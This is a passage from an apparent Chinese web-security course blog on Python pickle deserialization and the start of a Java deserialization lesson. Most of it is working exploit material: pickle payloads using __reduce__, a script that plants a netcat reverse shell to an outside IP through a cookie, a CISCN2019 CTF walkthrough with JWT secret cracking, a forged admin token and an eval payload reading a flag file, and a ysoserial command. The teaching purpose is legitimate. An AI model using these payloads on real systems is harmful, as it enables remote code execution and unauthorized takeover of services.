class="line">​    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">​        <span class="built_in">print</span>(<span class="string">&#x27;反序列化调用&#x27;</span>)</span><br><span class="line">​        <span class="keyword">return</span> (os.system,(<span class="string">&#x27;calc&#x27;</span>,))</span><br><span class="line">a = A()</span><br><span class="line">p_a = pickle.dumps(a)</span><br><span class="line">pickle.loads(p_a)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;==========&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(p_a)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SerializePerson</span>():</span><br><span class="line">​    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name</span>):</span><br><span class="line">​        self.name = name</span><br><span class="line"></span><br><span class="line">​    \<span class="comment"># 构造 __setstate__ 方法</span></span><br><span class="line">​    <span class="keyword">def</span> <span class="title function_">__setstate__</span>(<span class="params">self, name</span>):</span><br><span class="line">​        os.system(<span class="string">&#x27;calc&#x27;</span>)  <span class="comment"># 恶意代码</span></span><br><span class="line">tmp = pickle.dumps(SerializePerson(<span class="string">&#x27;tom&#x27;</span>))  <span class="comment">#序列化</span></span><br><span class="line">pickle.loads(tmp)  <span class="comment"># 反序列化 此时会弹出计算器</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">\<span class="comment">#序列化魔术方法调用-__getstate__</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">​    <span class="keyword">def</span> <span class="title function_">__getstate__</span>(<span class="params">self</span>):</span><br><span class="line">​        <span class="built_in">print</span>(<span class="string">&#x27;序列化调用&#x27;</span>)</span><br><span class="line">​        os.system(<span class="string">&#x27;calc&#x27;</span>)</span><br><span class="line">a = A()</span><br><span class="line">p_a = pickle.dumps(a)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;==========&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(p_a)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">\<span class="comment">#反序列化安全漏洞产生-DEMO</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">​    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, func, arg</span>):</span><br><span class="line">​        self.func = func</span><br><span class="line">​        self.arg = arg</span><br><span class="line">​        <span class="built_in">print</span>(<span class="string">&#x27;This is A&#x27;</span>)</span><br><span class="line">​    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">​        <span class="built_in">print</span>(<span class="string">&#x27;反序列化调用&#x27;</span>)</span><br><span class="line">​        <span class="keyword">return</span> (self.func, self.arg)</span><br><span class="line">a = A(os.system, (<span class="string">&#x27;calc&#x27;</span>,))</span><br><span class="line">p_a = pickle.dumps(a)</span><br><span class="line">pickle.loads(p_a)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;==========&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(p_a)</span><br></pre></td></tr></table></figure><h4 id="CTF-反序列化漏洞利用-构造-amp-RCE"><a href="#CTF-反序列化漏洞利用-构造-amp-RCE" class="headerlink" title="#CTF-反序列化漏洞利用-构造&amp;RCE"></a>#CTF-反序列化漏洞利用-构造&amp;RCE</h4><p>环境介绍：利用Python-flask搭建的web应用，获取当前用户的信息，进行展示，在获取用户的信息时，通过对用户数据进行反序列化获取导致的安全漏洞！</p><p>Server服务器：web应用接收cookie里面的user值，对其进行反序列化操作</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line"></span><br><span class="line">​    <span class="keyword">try</span>:</span><br><span class="line">​        user = base64.b64decode(request.cookies.get(<span class="string">&#x27;user&#x27;</span>))</span><br><span class="line">​        user = pickle.loads(user)</span><br><span class="line">​        username = user[<span class="string">&quot;username&quot;</span>]</span><br><span class="line">​    <span class="keyword">except</span>:</span><br><span class="line">​        username = <span class="string">&quot;Guest&quot;</span></span><br><span class="line">​    <span class="keyword">return</span> <span class="string">&quot;Hello %s&quot;</span> % username</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">​    app.run(</span><br><span class="line">​        host=<span class="string">&#x27;192.168.1.3&#x27;</span>,</span><br><span class="line">​        port=<span class="number">5000</span>,</span><br><span class="line">​        debug=<span class="literal">True</span></span><br><span class="line">​    )</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Hacker服务器：cookie植入user值,user值就是生成的恶意序列化数据</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">exp</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">​    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">​        s=<span class="string">&#x27;c:/nc -e cmd 192.168.46.137 6666&#x27;</span></span><br><span class="line">​        <span class="keyword">return</span> (os.system, (s,))</span><br><span class="line">e = exp()</span><br><span class="line">s = pickle.dumps(e)</span><br><span class="line"><span class="built_in">print</span>(s)</span><br><span class="line">response = requests.get(<span class="string">&quot;http://192.168.1.3:5000/&quot;</span>, cookies=<span class="built_in">dict</span>(</span><br><span class="line">​    user=base64.b64encode(s).decode()</span><br><span class="line">))</span><br><span class="line"><span class="built_in">print</span>(response.content)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>hacker将反弹shell的命令进行序列化并且base64加密</p><p><img src="/../images/Day48-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-Py%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E9%93%BE%E6%9E%84%E9%80%A0-%E8%87%AA%E5%8A%A8%E5%AE%A1%E8%AE%A1bandit-%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95/image-20230221160547454.png" alt="image-20230221160547454"></p><p>在另一台linux服务器上监听5566</p><p><img src="/../images/Day48-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-Py%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E9%93%BE%E6%9E%84%E9%80%A0-%E8%87%AA%E5%8A%A8%E5%AE%A1%E8%AE%A1bandit-%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95/image-20230221160840503.png" alt="image-20230221160840503"></p><p>将序列化后base64编码复制下来，在受害者server的网站抓包，并加上cookie一栏，添加user值</p><p><img src="/../images/Day48-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-Py%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E9%93%BE%E6%9E%84%E9%80%A0-%E8%87%AA%E5%8A%A8%E5%AE%A1%E8%AE%A1bandit-%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95/image-20230221160938842.png" alt="image-20230221160938842"></p><p>发包后，可获得shell</p><p><img src="/../images/Day48-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-Py%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E9%93%BE%E6%9E%84%E9%80%A0-%E8%87%AA%E5%8A%A8%E5%AE%A1%E8%AE%A1bandit-%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95/image-20230221161031516.png" alt="image-20230221161031516"></p><h4 id="CTF-CISCN2019华北-JWT-amp-反序列化"><a href="#CTF-CISCN2019华北-JWT-amp-反序列化" class="headerlink" title="#CTF-CISCN2019华北-JWT&amp;反序列化"></a>#CTF-CISCN2019华北-JWT&amp;反序列化</h4><p>通过提示-&gt;寻找LV6-&gt;购买修改支付逻辑-&gt;绕过admin限制需修改jwt值-&gt;爆破jwt密匙-&gt;重组jwt值成为admin-&gt;购买进入会员中心-&gt;源码找到文件压缩源码-&gt;Python代码审计反序列化-&gt;构造读取flag代码进行序列化打印-&gt;提交获取</p><p>考点1：JWT 身份验证 攻击点：</p><p><a href="https://www.cnblogs.com/vege/p/14468030.html">https://www.cnblogs.com/vege/p/14468030.html</a></p><p><a href="https://github.com/ck00004/c-jwt-cracker">https://github.com/ck00004/c-jwt-cracker</a></p><p>考点2：Python 代码审计 反序列化：</p><p>自动工具：<a href="https://github.com/PyCQA/bandit">https://github.com/PyCQA/bandit</a></p><p>参考资料：<a href="https://github.com/bit4woo/python_sec">https://github.com/bit4woo/python_sec</a></p><p>1、获取LV6</p><p>2、购买后伪造admin身份:</p><p>获取密匙：</p><p>&#x2F;c-jwt-cracker</p><p>.&#x2F;jwtcrack eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InhpYW9kaSJ9.UHCykJtUJ4jeYAWAYFU73QiNhn7mZLUHE7kKo4oJpK8</p><p>重组密文：</p><p>修改jwt网站：<a href="https://jwt.io/">https://jwt.io/</a>  爆破后的密钥：1Kun</p><p>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.40on__HQ8B2-wM1ZSwax3ivRK4j54jlaXv-1JjQynjo</p><p>3、代码审计-反序列化</p><p>伪造Admin后发现返回数据包存在源码下载，下载后代码审计：</p><p>测试触发：URL对应代码块：路由-&gt;文件</p><p>触发代码Payload:（源码是2版本）</p><p>要注意对方的python是什么版本，自己就用什么版本书写payload，否则会出错(可以通过一些函数判断如：python2的print内容不需要括号，python3则需要加上括号)</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">payload</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">​    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">​       <span class="keyword">return</span> (<span class="built_in">eval</span>, (<span class="string">&quot;open(&#x27;/flag.txt&#x27;,&#x27;r&#x27;).read()&quot;</span>,))</span><br><span class="line">a = pickle.dumps(payload())</span><br><span class="line">a = urllib.quote(a)</span><br><span class="line"><span class="built_in">print</span> a</span><br></pre></td></tr></table></figure><p>Payload：</p><p>c__builtin__%0Aeval%0Ap0%0A%28S%22open%28%27&#x2F;flag.txt%27%2C%27r%27%29.read%28%29%22%0Ap1%0Atp2%0ARp3%0A.</p><h5 id="实现过程："><a href="#实现过程：" class="headerlink" title="实现过程："></a>实现过程：</h5><p>打开发现要找到lv6的</p><p><img src="/../images/Day48-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-Py%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E9%93%BE%E6%9E%84%E9%80%A0-%E8%87%AA%E5%8A%A8%E5%AE%A1%E8%AE%A1bandit-%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95/image-20230221162926829.png" alt="image-20230221162926829"></p><p>观察request包发现如果是lv4则有lv4.png,所以通过这个规律用python脚本找到lv6.png在哪一页</p><p><img src="/../images/Day48-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-Py%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E9%93%BE%E6%9E%84%E9%80%A0-%E8%87%AA%E5%8A%A8%E5%AE%A1%E8%AE%A1bandit-%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95/image-20230221163107392.png" alt="image-20230221163107392"></p><p>1、获取LV6</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">1000</span>):</span><br><span class="line">​    url=<span class="string">&#x27;http://119.45.216.198:8083/shop?page=&#x27;</span>+<span class="built_in">str</span>(i)</span><br><span class="line">​    result=requests.get(url).content</span><br><span class="line">​    <span class="keyword">try</span>:</span><br><span class="line">​        <span class="keyword">if</span> <span class="string">&#x27;lv6.png&#x27;</span> <span class="keyword">in</span> result.decode(<span class="string">&#x27;utf-8&#x27;</span>):</span><br><span class="line">​            <span class="built_in">print</span>(<span class="string">&#x27;-&gt;&#x27;</span>+url+<span class="string">&#x27;|yes&#x27;</span>)</span><br><span class="line">​            <span class="keyword">break</span></span><br><span class="line">​        <span class="keyword">else</span>:</span><br><span class="line">​            <span class="built_in">print</span>(<span class="string">&#x27;-&gt;&#x27;</span> + url + <span class="string">&#x27;|no&#x27;</span>)</span><br><span class="line">​    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">​        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>在181页停止，所以是在181页</p><p><img src="/../images/Day48-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-Py%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E9%93%BE%E6%9E%84%E9%80%A0-%E8%87%AA%E5%8A%A8%E5%AE%A1%E8%AE%A1bandit-%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95/image-20230221163255545.png" alt="image-20230221163255545"></p><p>访问url181页</p><p><img src="/../images/Day48-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-Py%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E9%93%BE%E6%9E%84%E9%80%A0-%E8%87%AA%E5%8A%A8%E5%AE%A1%E8%AE%A1bandit-%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95/image-20230221163331221.png" alt="image-20230221163331221"></p><p>进入后点击购买lv6发现失败，原因是钱不够</p><p><img src="/../images/Day48-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-Py%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E9%93%BE%E6%9E%84%E9%80%A0-%E8%87%AA%E5%8A%A8%E5%AE%A1%E8%AE%A1bandit-%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95/image-20230221163433129.png" alt="image-20230221163433129"></p><p>抓包将折扣0.8改为0.0000000008</p><p><img src="/../images/Day48-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-Py%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E9%93%BE%E6%9E%84%E9%80%A0-%E8%87%AA%E5%8A%A8%E5%AE%A1%E8%AE%A1bandit-%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95/image-20230221163558845.png" alt="image-20230221163558845"></p><p>发现需要admin才能改折扣</p><p><img src="/../images/Day48-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-Py%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E9%93%BE%E6%9E%84%E9%80%A0-%E8%87%AA%E5%8A%A8%E5%AE%A1%E8%AE%A1bandit-%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95/image-20230221163629740.png" alt="image-20230221163629740"></p><p>刚才抓的数据包发现有jwt验证，考虑尝试修改jwt</p><p><img src="/../images/Day48-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-Py%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E9%93%BE%E6%9E%84%E9%80%A0-%E8%87%AA%E5%8A%A8%E5%AE%A1%E8%AE%A1bandit-%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95/image-20230221163738225.png" alt="image-20230221163738225"></p><p>在jwt网站修改为admin，但是发现需要密匙才能修改成功</p><p><img src="/../images/Day48-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-Py%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E9%93%BE%E6%9E%84%E9%80%A0-%E8%87%AA%E5%8A%A8%E5%AE%A1%E8%AE%A1bandit-%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95/image-20230221164338263.png" alt="image-20230221164338263"></p><p>所以采取爆破jwt密匙脚本：</p><blockquote><p>cd &#x2F;c-jwt-cracker</p><p>.&#x2F;jwtcrack eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InhpYW9kaSJ9.UHCykJtUJ4jeYAWAYFU73QiNhn7mZLUHE7kKo4oJpK8</p></blockquote><p>爆破出密匙是1KUN</p><p><img src="/../images/Day48-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-Py%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E9%93%BE%E6%9E%84%E9%80%A0-%E8%87%AA%E5%8A%A8%E5%AE%A1%E8%AE%A1bandit-%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95/image-20230221165144676.png" alt="image-20230221165144676"></p><p>将jwt复制到刚才的数据包进行替换jwt，放包成功：</p><p><img src="/../images/Day48-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-Py%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E9%93%BE%E6%9E%84%E9%80%A0-%E8%87%AA%E5%8A%A8%E5%AE%A1%E8%AE%A1bandit-%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95/image-20230221165242902.png" alt="image-20230221165242902"></p><p>右键源码下有压缩包，由此进入python反序列化利用</p><p><img src="/../images/Day48-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-Py%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E9%93%BE%E6%9E%84%E9%80%A0-%E8%87%AA%E5%8A%A8%E5%AE%A1%E8%AE%A1bandit-%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95/image-20230221165430307.png" alt="image-20230221165430307"></p><p>打开源码搜索序列化函数pickle</p><p><img src="/../images/Day48-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-Py%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E9%93%BE%E6%9E%84%E9%80%A0-%E8%87%AA%E5%8A%A8%E5%AE%A1%E8%AE%A1bandit-%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95/image-20230221165611327.png" alt="image-20230221165611327"></p><p>此处接收become进行url编码和反序列化操作</p><p><img src="/../images/Day48-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-Py%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E9%93%BE%E6%9E%84%E9%80%A0-%E8%87%AA%E5%8A%A8%E5%AE%A1%E8%AE%A1bandit-%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95/image-20230221170003334.png" alt="image-20230221170003334"></p><p>攻击则采用序列化脚本</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">payload</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">       <span class="keyword">return</span> (<span class="built_in">eval</span>, (<span class="string">&quot;open(&#x27;/flag.txt&#x27;,&#x27;r&#x27;).read()&quot;</span>,))</span><br><span class="line">a = pickle.dumps(payload())</span><br><span class="line">a = urllib.quote(a)</span><br><span class="line"><span class="built_in">print</span> a</span><br></pre></td></tr></table></figure><p>执行cmd命令生成payload</p><p><img src="/../images/Day48-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-Py%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E9%93%BE%E6%9E%84%E9%80%A0-%E8%87%AA%E5%8A%A8%E5%AE%A1%E8%AE%A1bandit-%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95/image-20230221170707658.png" alt="image-20230221170707658"></p><p>找到数据传输的地方，看是哪个文件调用的传输become参数的def post方法，找哪里调用了Admin.py文件，于是追踪哪里调用了类对象AdminHandler</p><p><img src="/../images/Day48-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-Py%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E9%93%BE%E6%9E%84%E9%80%A0-%E8%87%AA%E5%8A%A8%E5%AE%A1%E8%AE%A1bandit-%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95/image-20230221171349789.png" alt="image-20230221171349789"></p><p>发现是init文件调用了此方法，访问路径为&#x2F;b1g_m4mber,后面就可构造执行数据包了</p><p><img src="/../images/Day48-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-Py%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E9%93%BE%E6%9E%84%E9%80%A0-%E8%87%AA%E5%8A%A8%E5%AE%A1%E8%AE%A1bandit-%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95/image-20230221171510030.png" alt="image-20230221171510030"></p><h4 id="代码审计-自动化工具-bandit安装及使用"><a href="#代码审计-自动化工具-bandit安装及使用" class="headerlink" title="#代码审计-自动化工具-bandit安装及使用"></a>#代码审计-自动化工具-bandit安装及使用</h4><p>参考：<a href="https://bandit.readthedocs.io/">https://bandit.readthedocs.io/</a></p><p>安装：pip install bandit</p><p>linux:</p><p>安装后会在当前Python目录下bin</p><p>使用：bandit -r 需要审计的源码目录</p><p>windows:</p><p>安装后会在当前Python目录下script</p><p>使用：bandit -r 需要审计的源码目录</p><p>bandit可以检索到上个案例中的反序列化漏洞</p><p><img src="/../images/Day48-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-Py%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E9%93%BE%E6%9E%84%E9%80%A0-%E8%87%AA%E5%8A%A8%E5%AE%A1%E8%AE%A1bandit-%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95/image-20230221172031382.png" alt="image-20230221172031382"></p>]]></content>
      
      
      <categories>
          
          <category> Web攻防 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Day47 WEB攻防-通用漏洞&amp;Java反序列化&amp;EXP生成&amp;数据提取&amp;组件安全</title>
      <link href="/2023/02/03/Day47-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-EXP%E7%94%9F%E6%88%90-%E6%95%B0%E6%8D%AE%E6%8F%90%E5%8F%96-%E7%BB%84%E4%BB%B6%E5%AE%89%E5%85%A8/"/>
      <url>/2023/02/03/Day47-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-EXP%E7%94%9F%E6%88%90-%E6%95%B0%E6%8D%AE%E6%8F%90%E5%8F%96-%E7%BB%84%E4%BB%B6%E5%AE%89%E5%85%A8/</url>
      
        <content type="html"><![CDATA[<h3 id="知识点："><a href="#知识点：" class="headerlink" title="#知识点："></a>#知识点：</h3><p>1、Java反序列化演示-原生API接口</p><p>2、Java反序列化漏洞利用-Ysoserial使用</p><p>3、Java反序列化漏洞发现利用点-函数&amp;数据</p><p>4、Java反序列化考点-真实&amp;CTF赛题-审计分析</p><h3 id="内容点："><a href="#内容点：" class="headerlink" title="#内容点："></a>#内容点：</h3><p>1、明白-Java反序列化原理</p><p>2、判断-Java反序列化漏洞</p><p>3、学会-Ysoserial工具使用</p><p>4、学会-SerializationDumper</p><p>5、了解-简要Java代码审计分析</p><h3 id="前置知识"><a href="#前置知识" class="headerlink" title="#前置知识:"></a>#前置知识:</h3><h4 id="序列化和反序列化的概念："><a href="#序列化和反序列化的概念：" class="headerlink" title="序列化和反序列化的概念："></a>序列化和反序列化的概念：</h4><p>序列化：把Java对象转换为字节序列的过程。</p><p>反序列化：把字节序列恢复为Java对象的过程。</p><p>对象的序列化主要有两种用途：</p><p>把对象的字节序列永久地保存到硬盘上，通常存放在一个文件中；（持久化对象）</p><p>在网络上传送对象的字节序列。（网络传输对象）</p><h4 id="函数接口："><a href="#函数接口：" class="headerlink" title="函数接口："></a>函数接口：</h4><p>Java： Serializable Externalizable接口、fastjson、jackson、gson、ObjectInputStream.read、ObjectObjectInputStream.readUnshared、XMLDecoder.read、ObjectYaml.loadXStream.fromXML、ObjectMapper.readValue、JSON.parseObject等</p><p>PHP： serialize()、 unserialize() </p><p>Python：pickle</p><h4 id="数据出现："><a href="#数据出现：" class="headerlink" title="数据出现："></a>数据出现：</h4><p>1、功能特性：</p><p>反序列化操作一般应用在导入模板文件、网络通信、数据传输、日志格式化存储、对象数据落磁盘、或DB存储等业务场景。因此审计过程中重点关注这些功能板块。</p><p>2、数据特性：</p><p>一段数据以<strong>rO0AB</strong>开头，你基本可以确定这串就是JAVA序列化base64加密的数据。</p><p>或者如果以<strong>aced</strong>开头，那么他就是这一段java序列化的16进制。</p><p>3、出现具体：</p><p>http参数，cookie，sesion，存储方式可能是base64(rO0），压缩后的base64(H4s),MII等Servlets http,Sockets,Session管理器，包含的协议就包括：JMX,RMI,JMS,JND1等(\xac\Xed) xm lXstream,XmldEcoder等（http Body:Content-type: application&#x2F;xml）json(jackson,fastjson)http请求中包含</p><h4 id="发现："><a href="#发现：" class="headerlink" title="-发现："></a>-发现：</h4><p>黑盒分析：数据库出现地-观察数据特性</p><p>白盒分析：组件安全&amp;函数搜索&amp;功能模块</p><h4 id="利用："><a href="#利用：" class="headerlink" title="-利用："></a>-利用：</h4><p>Ysoserial集成的jar包配合生成，特性的专业漏洞利用工具等</p><h3 id="演示案例："><a href="#演示案例：" class="headerlink" title="演示案例："></a>演示案例：</h3><p>➢ 原生API-Ysoserial_URLDNS使用</p><p>➢ 三方组件-Ysoserial_支持库生成使用</p><p>➢ 解密分析-SerializationDumper数据分析</p><p>➢ CTF赛题-[网鼎杯2020朱雀组]ThinkJava</p><h3 id="复现："><a href="#复现：" class="headerlink" title="复现："></a>复现：</h3><h5 id="➢-原生API-Ysoserial-URLDNS使用"><a href="#➢-原生API-Ysoserial-URLDNS使用" class="headerlink" title="➢ 原生API-Ysoserial_URLDNS使用"></a>➢ 原生API-Ysoserial_URLDNS使用</h5><p>在dnslog生成url测试dns连接：</p><p>没组件生成DNS利用：</p><blockquote><p>java -jar ysoserial-0.0.6-SNAPSHOT-all.jar URLDNS “<a href="http://5csix6.dnslog.cn/">http://5csix6.dnslog.cn</a>“ &gt; a.bin</p></blockquote><p><img src="/../images/Day47-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-EXP%E7%94%9F%E6%88%90-%E6%95%B0%E6%8D%AE%E6%8F%90%E5%8F%96-%E7%BB%84%E4%BB%B6%E5%AE%89%E5%85%A8/image-20230221130153008.png" alt="image-20230221130153008"></p><p>复制粘贴base64编码后的内容：</p><p><img src="/../images/Day47-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-EXP%E7%94%9F%E6%88%90-%E6%95%B0%E6%8D%AE%E6%8F%90%E5%8F%96-%E7%BB%84%E4%BB%B6%E5%AE%89%E5%85%A8/image-20230221130459043.png" alt="image-20230221130459043"></p><p>发现有回显：</p><p><img src="/../images/Day47-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-EXP%E7%94%9F%E6%88%90-%E6%95%B0%E6%8D%AE%E6%8F%90%E5%8F%96-%E7%BB%84%E4%BB%B6%E5%AE%89%E5%85%A8/image-20230221130416891.png" alt="image-20230221130416891"></p><h5 id="➢-三方组件-Ysoserial-支持库生成使用"><a href="#➢-三方组件-Ysoserial-支持库生成使用" class="headerlink" title="➢ 三方组件-Ysoserial_支持库生成使用"></a>➢ 三方组件-Ysoserial_支持库生成使用</h5><h6 id="分析漏洞："><a href="#分析漏洞：" class="headerlink" title="分析漏洞："></a>分析漏洞：</h6><p>靶场webgoat—Insecure Deserializetion—5</p><p>题目给的数据是rO0AB开头，所以是经过了base64加密的java序列化对象。</p><p><img 